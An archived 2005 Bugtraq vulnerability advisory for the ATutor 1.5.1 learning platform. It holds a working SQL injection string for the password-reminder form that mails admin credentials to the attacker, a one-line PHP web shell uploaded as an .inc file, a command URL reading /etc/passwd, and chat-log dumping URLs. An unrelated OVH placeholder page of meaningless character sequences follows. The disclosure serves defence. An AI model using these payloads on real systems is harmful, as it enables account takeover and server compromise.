=== Content from marc.info_3b91ea52_20250125_080107.html ===

```
[[prev in list](?l=bugtraq&m=112682299625846&w=2)] [[next in list](?l=bugtraq&m=112682198917509&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    ATutor 1.5.1 SQL Injection / Admin credentials disclosure /
From:       [retrogod () aliceposta ! it](?a=112309789800001&r=1&w=2)
Date:       [2005-09-14 9:52:22](?l=bugtraq&r=1&w=2&b=200509)
Message-ID: [20050914095222.2002.qmail () securityfocus ! com](?i=20050914095222.2002.qmail%20()%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=112671176100432&q=mbox) or [body](?l=bugtraq&m=112671176100432&q=raw)]

ATUTOR 1.5.1 (possibly prior versions)
SQL INJECTION / ADMIN & USERS CREDENTIALS DISCLOSURE / INFORMATION DISCLOSURE /
USER IMPERSONATION / REMOTE CODE EXECUTION

software:

site: <http://www.atutor.ca/>

description: "ATutor is an Open Source Web-based Learning Content Management System \
(LCMS) designed with accessibility and adaptability in mind. Administrators can \
install or update ATutor in minutes, and develop custom templates to give ATutor a \
new look. Educators can quickly assemble, package, and redistribute Web-based \
instructional content, easily retrieve and import prepackaged content, and conduct \
their courses online. Students learn in an adaptive learning environment."

a) if magic_quotes_gpc is off in php.ini - > SQL INJECTION
   without to have an user account, you can use password remider to send yourself \
admin  login & password, no need for exploit code:

   go to http://[target]/[path]/password_reminder.php

   and in the email field type:

   ' UNION SELECT login, password, 'your_email@domain.com' FROM AT_admins /*

   look at the vulnerable code in password_reminder.php:

   ...
   $sql="SELECT login, password, email FROM ".TABLE_PREFIX."members WHERE \
email='$_POST[form_email]'";  $result = mysql_query($sql,$db);
if ($row = mysql_fetch_assoc($result)) {

$r_login = $row['login'];
$r_passwd= $row['password'];
$r_email = $row['email'];

$tmp_message  = _AT(array('password_request2',$_base_href))."\n\n";
$tmp_message .= _AT('web_site').' : '.$_base_href."\n";
$tmp_message .= _AT('login_name').' : '.$r_login."\n";
$tmp_message .= _AT('password').' : '.$r_passwd."\n";

require(AT_INCLUDE_PATH . 'classes/phpmailer/atutormailer.class.php');

$mail = new ATutorMailer;

$mail->From     = EMAIL;
$mail->AddAddress($r_email);
$mail->Subject = SITE_NAME . ': ' . _AT('password_reminder');
$mail->Body    = $tmp_message;

if(!$mail->Send()) {
   //echo 'There was an error sending the message';
   $msg->printErrors('SENDING_ERROR');
   exit;
}

$msg->addFeedback('PASSWORD_SUCCESS');
   ...

   $_POST[form_email] is not filtered in any way as you can see, so the query become:

   SELECT login, password, email FROM AT_members WHERE email='' UNION SELECT login, \
password, 'your_email@domain.com' FROM AT_admins /*'

   /* are the Mysql comment chars so this is a valid query

   $r_login and $r_passord are admin user & passord but $r_email is yours! ;)

   also, you can have the password of any user typing:

   ' UNION SELECT login, password, 'your_email@domain.com' FROM AT_members where \
login='user_whom_you_want_the_password' /*

   if you want to see if your course server is vulnerable just type ' in email field, \
you will have an error like this:

   Warning: mysql_fetch_assoc(): supplied argument is not a valid MySQL result \
resource in  [pathto]/password_reminder.php on line 27

   if not, you will see a message like this:

   The following errors occurred:
   * No account found with that email address.

b) after you have your stealed admin or educator account (yes, an educator can upload \
xecutable files :) )  you can execute arbitrary commands on target system uploading \
an .inc file (this extension is not checked)  with php code inside, example:

   <?php error_reporting(0); system($HTTP_GET_VARS[cmd]; ?>

   then you can launch commands, example:

   http://[target]/[path]/atutor/content/2/cmd.inc?cmd=cat%20/etc/passwd

   (usually upload dir is 'content' if admin do not change it, and subdir is numbered \
by the time registration  of user, you can quickly bruteforce the url manually)

   look at the list of illegal extensions in config.inc.php:

   ...
   /* Illegal file types, by extension. Include any extensions             */
   /* you do not want to allow for uploading. (Just the extention          */
   /* without the leading dot.)                                            */
   $IllegalExtentions = \
array('exe','asp','php','php3','bat','cgi','pl','com','vbs','reg','pcd','pif','scr','bas','inf','vb','vbe','wsc','wsf','wsh');

   ...

   but where are .inc, .php4, .phtml, .html, .pwml and so on if you do not set?
   should be better to setup which kind of files you CAN upload...

c) without have an account a user can read chat conversation without to be logged in, \
making GET requests for  chat temporary files:

   example:
   http://[target]/[path]/atutor/content/chat/2/msgs/1.message
   http://[target]/[path]/atutor/content/chat/2/msgs/2.message
   http://[target]/[path]/atutor/content/chat/2/msgs/3.message

   ciclyng this GET requests a user can dump all chat archive

rgod
site: <http://rgod.altervista.org>
mail: retrogod [at] aliceposta.it
original advisory: <http://rgod.altervista.org/atutor151.html>

[[prev in list](?l=bugtraq&m=112682299625846&w=2)] [[next in list](?l=bugtraq&m=112682198917509&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.vupen.com_74a5615b_20250125_080112.html ===

[![](/__ovh/common/img/logo-white.png)](https://www.ovhcloud.com/)

![](/__ovh/common/img/icon-traffic-cone.png)

# Site en construction

![](/__ovh/common/img/shadow.png)

Besoin d'assistance ou d'informations ?

[![](/__ovh/common/img/icon-book.png)
Guides](https://docs.ovh.com/fr/hosting/ "Guides")
[![](/__ovh/common/img/icon-speech-bubble.png)
Forum](https://community.ovh.com/ "Forum")
[![](/__ovh/common/img/icon-user-support.png)
Contact](https://help.ovhcloud.com/fr/ "Contact")
[![](/__ovh/common/img/icon-app-gear.png)
Espace Client](https://www.ovh.com/manager/ "Espace Client")

© Copyright 1999 [OVHcloud](https://www.ovhcloud.com/)

v1v2v3v4v5v6v7v8v9v10v11v12v13v14v15v16v17v18v19v20v21v22v23v24v25v26v27v28v29v30v31v32v33v34v35v36v37v38v39v40v41v42v43v44v45v46v47v48v49v50v51v52v53v54v55v56v57v58v59v60v61v62v63v64v65v66v67v68v69v70

u1u2u3u4u5u6u7u8u9u10u11u12u13u14u15u16u17u18u19u20u21u22u23u24u25u26u27u28u29u30u31u32u33u34u35u36u37u38u39u40u41u42u43u44u45u46u47u48u49u50u51u52u53u54u55u56u57u58u59u60u61u62u63u64u65u66u67u68u69

p1p2p3p4p5p6p7p8p9p10p11p12p13p14p15p16p17p18p19p20p21p22p23p24p25p26p27p28p29p30p31p32p33p34p35p36p37p38p39p40p41p42p43p44p45p46p47p48p49p50p51p52p53p54p55p56p57p58p59p60p61p62p63p64

e1e2e3e4e5e6e7e8e9e10e11e12e13e14e15e16e17e18e19e20e21e22e23e24e25e26e27e28e29e30e31e32e33e34e35e36e37e38e39e40e41e42e43e44e45e46e47e48e49e50e51e52e53

n1n2n3n4n5n6n7n8n9n10n11n12n13n14n15n16n17n18n19n20n21n22n23n24n25n26n27n28n29n30n31n32n33n34n35n36n37n38n39n40n41n42n43n44n45n46n47n48n49n50n51n52n53n54n55n56n57n58n59n60n61n62

---

c1c2c3c4c5c6c7c8c9c10c11c12c13c14c15c16c17c18c19c20c21c22c23c24c25c26c27c28c29c30c31c32c33c34c35c36c37c38c39c40c41c42c43c44c45c46c47c48c49c50c51

o1o2o3o4o5o6o7o8o9o10o11o12o13o14o15o16o17o18o19o20o21o22o23o24o25o26o27o28o29o30o31o32o33o34o35o36o37o38o39o40o41o42o43o44o45o46o47o48o49o50o51o52o53o54o55o56o57o58o59o60o61o62o63

m1m2m3m4m5m6m7m8m9m10m11m12m13m14m15m16m17m18m19m20m21m22m23m24m25m26m27m28m29m30m31m32m33m34m35m36m37m38m39m40m41m42m43m44m45m46m47m48m49m50m51m52m53m54m55m56m57m58m59m60m61


